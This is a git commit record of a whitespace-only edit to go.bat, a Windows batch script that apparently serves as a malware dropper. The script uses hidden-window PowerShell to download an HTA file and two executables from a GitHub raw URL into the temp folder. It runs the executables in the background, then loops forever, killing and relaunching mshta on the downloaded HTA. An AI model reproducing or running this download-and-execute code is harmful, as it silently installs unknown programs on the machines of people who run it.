e6dbbd42c9aca158e802a64272031759db48ccb9
jinafaz <48602030+jinafaz@users.noreply.github.com>
2019-03-16 18:14:07 +0000

    Update go.bat

--- go.bat
+++ go.bat
@@ -1,22 +1,22 @@
 :top0
- timeout /t 1 &
+timeout /t 1 & 
 powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta -Outfile %tmp%/mathew.hta
-goto top1
+goto top1 
 
-:top1
- timeout /t 1 &
+:top1 
+timeout /t 1 & 
 powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mario.exe -Outfile %tmp%/mario.exe
-cmd /c start /B %tmp%/mario.exe
-goto top2
+cmd /c start /B %tmp%/mario.exe 
+goto top2 
 
-:top2
- timeout /t 1 &
+:top2 
+timeout /t 1 & 
 powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/coral.exe -Outfile %tmp%/coral.exe
-cmd /c start /B %tmp%/coral.exe
+cmd /c start /B %tmp%/coral.exe 
 goto top3 
 
 :top3 
-timeout /t 100 &
-taskkill /IM mshta.exe /F
-powershell invoke-expression 'mshta %tmp%/mathew.hta'
+timeout /t 100 & 
+taskkill /IM mshta.exe /F 
+powershell invoke-expression 'mshta %tmp%/mathew.hta' 
 goto top3
